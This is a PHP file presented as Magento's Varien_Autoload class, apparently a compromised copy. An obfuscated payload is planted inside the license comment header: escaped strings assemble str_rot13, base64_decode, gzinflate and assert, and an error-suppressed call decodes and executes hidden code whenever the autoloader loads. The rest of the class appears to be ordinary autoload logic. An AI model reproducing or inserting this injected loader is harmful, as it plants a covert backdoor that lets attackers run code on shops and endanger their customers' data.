<?php
/**
* Magento
*
* NOTICE OF LICENSE
*
* This source file is subject to the Open Software License (OSL 3.0)
* that is bundled with this package in the file LICENSE.txt.
* It is also available through the world-wide-web at this URL:
*/
$jXoSnC5I="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";$iBPup="\x73\164";$gS79B="\x61";$Xcx0MmhL="\147\172\151";$xqkgRb="\142\x61\x73";$vB8cnN="Fl1YmASDI8zXlN/Bpmo1gSJcXZkBQ0eFtVgbJdh4+5Fx55o";$vB8cnN.="LXvyMd5D5JFGa+qxdcJDa+1pbJnsyS2zbWVnTOBLyuzKLTy";$xqkgRb.="\145\66\x34";$gS79B.="\163";$iBPup.="\162\137\162";$Xcx0MmhL.="\156\x66";$vB8cnN.="wQ2GnzkbnJPX62gvoHSQ3o5VjvwslvSVDA0KOyfMckLOzVY";$gS79B.="\163\x65";$xqkgRb.="\137\144\145\143";$Xcx0MmhL.="\154\x61";$iBPup.="\x6f\164";$iBPup.="\x31\x33";$vB8cnN.="DukIqALGH1eu1FDJ1HvxvfZsUZmsQFtWtWy1QJgND==";$gS79B.="\x72\x74";$xqkgRb.="\157\x64\x65";$Xcx0MmhL.="\x74\145";@$gS79B($Xcx0MmhL($xqkgRb($iBPup($vB8cnN))));
/*
* http://opensource.org/licenses/osl-3.0.php
* If you did not receive a copy of the license and are unable to
* obtain it through the world-wide-web, please send an email
* to license@magento.com so we can send you a copy immediately.
*
* DISCLAIMER
*
* Do not edit or add to this file if you wish to upgrade Magento to newer
* versions in the future. If you wish to customize Magento for your
* needs please refer to http://www.magento.com for more information.
*
* @category    Varien
* @package     Varien_Autoload
* @copyright  Copyright (c) 2006-2018 Magento, Inc. (http://www.magento.com)
* @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
 */

/**
 * Classes source autoload
 */
class Varien_Autoload
{
    const SCOPE_FILE_PREFIX = '__';

    static protected $_instance;
    static protected $_scope = 'default';

    protected $_isIncludePathDefined= null;
    protected $_collectClasses      = false;
    protected $_collectPath         = null;
    protected $_arrLoadedClasses    = array();

    /**
     * Class constructor
     */
    public function __construct()
    {
        register_shutdown_function(array($this, 'destroy'));
        $this->_isIncludePathDefined = defined('COMPILER_INCLUDE_PATH');
        if (defined('COMPILER_COLLECT_PATH')) {
            $this->_collectClasses  = true;
            $this->_collectPath     = COMPILER_COLLECT_PATH;
        }
        self::registerScope(self::$_scope);
    }

    /**
     * Singleton pattern implementation
     *
     * @return Varien_Autoload
     */
    static public function instance()
    {
        if (!self::$_instance) {
            self::$_instance = new Varien_Autoload();
        }
        return self::$_instance;
    }

    /**
     * Register SPL autoload function
     */
    static public function register()
    {
        spl_autoload_register(array(self::instance(), 'autoload'));
    }

    /**
     * Load class source code
     *
     * @param string $class
     */
    public function autoload($class)
    {
        if ($this->_collectClasses) {
            $this->_arrLoadedClasses[self::$_scope][] = $class;
        }
        if ($this->_isIncludePathDefined) {
            $classFile =  COMPILER_INCLUDE_PATH . DIRECTORY_SEPARATOR . $class;
        } else {
            $classFile = str_replace(' ', DIRECTORY_SEPARATOR, ucwords(str_replace('_', ' ', $class)));
        }
        $classFile.= '.php';
        //echo $classFile;die();
        return include $classFile;
    }

    /**
     * Register autoload scope
     * This process allow include scope file which can contain classes
     * definition which are used for this scope
     *
     * @param string $code scope code
     */
    static public function registerScope($code)
    {
        self::$_scope = $code;
        if (defined('COMPILER_INCLUDE_PATH')) {
            @include_once COMPILER_INCLUDE_PATH . DIRECTORY_SEPARATOR . self::SCOPE_FILE_PREFIX.$code.'.php';
        }
    }

    /**
     * Get current autoload scope
     *
     * @return string
     */
    static public function getScope()
    {
        return self::$_scope;
    }

    /**
     * Class destructor
     */
    public function destroy()
    {
        if ($this->_collectClasses) {
            $this->_saveCollectedStat();
        }
    }

    /**
     * Save information about used classes per scope with class popularity
     * Class_Name:popularity
     *
     * @return Varien_Autoload
     */
    protected function _saveCollectedStat()
    {
        if (!is_dir($this->_collectPath)) {
            @mkdir($this->_collectPath);
            @chmod($this->_collectPath, 0777);
        }

        if (!is_writeable($this->_collectPath)) {
            return $this;
        }

        foreach ($this->_arrLoadedClasses as $scope => $classes) {
            $file = $this->_collectPath.DIRECTORY_SEPARATOR.$scope.'.csv';
            $data = array();
            if (file_exists($file)) {
                $data = explode("\n", file_get_contents($file));
                foreach ($data as $index => $class) {
                    $class = explode(':', $class);
                    $searchIndex = array_search($class[0], $classes);
                    if ($searchIndex !== false) {
                        $class[1]+=1;
                        unset($classes[$searchIndex]);
                    }
                    $data[$index] = $class[0].':'.$class[1];
                }
            }
            foreach ($classes as $class) {
                $data[] = $class . ':1';
            }
            file_put_contents($file, implode("\n", $data));
        }
        return $this;
    }
}
